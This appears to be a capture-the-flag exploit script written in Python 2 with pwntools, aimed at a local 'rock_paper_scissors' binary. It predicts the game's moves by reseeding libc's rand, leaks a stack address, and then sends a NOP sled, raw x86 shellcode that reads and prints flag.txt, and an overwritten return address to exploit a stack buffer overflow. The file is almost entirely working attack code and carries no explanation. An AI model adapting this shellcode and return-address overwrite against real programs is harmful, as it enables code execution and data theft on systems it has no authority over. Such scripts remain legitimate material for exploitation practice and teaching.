from pwnlib.tubes.process import process
from ctypes import *
import struct
import time
import sys

#You need to import libc to get the correct sequence
libc = CDLL("libc.so.6")
libc.srand(4276545)

RPS = ("R", "P", "S")

s = process("./rock_paper_scissors")

print s.recv()
s.sendline("A"*58)

s.sendline("1")
print s.recv()

for i in range(50):
	choice = libc.rand() % 3
	choice = (choice + 1) % 3
	s.sendline(RPS[choice])
	sys.stdout.write("%s" %s.recv())
	sys.stdout.flush()
	time.sleep(0.5)

print s.recv(timeout=5)

print "PAUSE: pid = %d" %s.pid
raw_input()

s.sendline("99")

print s.recvuntil(">>>", timeout=5)

print s.recvuntil("@", timeout=5)
stack = s.recv(timeout=5)[1:11]

print "[!] got stack pointer: 0x%x "  %int(stack, 16)

stack = struct.pack("<I", int(stack, 16))

#sys_open(flag.txt), sys_read(flag.txt_fd), sys_write(stdout) len(45)
custom_shellcode = ("\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6"
"\xb0\x05\x6a\x00\x68\x2e\x74\x78\x74\x68\x66\x6c\x61\x67\x89\xe3\xcd"
"\x80\x87\xd9\x93\xb0\x03\xb2\xff\xcd\x80\x92\xb0\x04\x31\xdb\x43\xcd\x80")

ret_overwrite = 144

#	       nopsled	read_file_code    padding     					   ret      padding
s.sendline("\x90"*80 + custom_shellcode + "\x90"*(ret_overwrite - (80+45)) + stack + "\x90"*30)

print s.recv(timeout=5)

print "DONE"
raw_input("Press enter to quit")
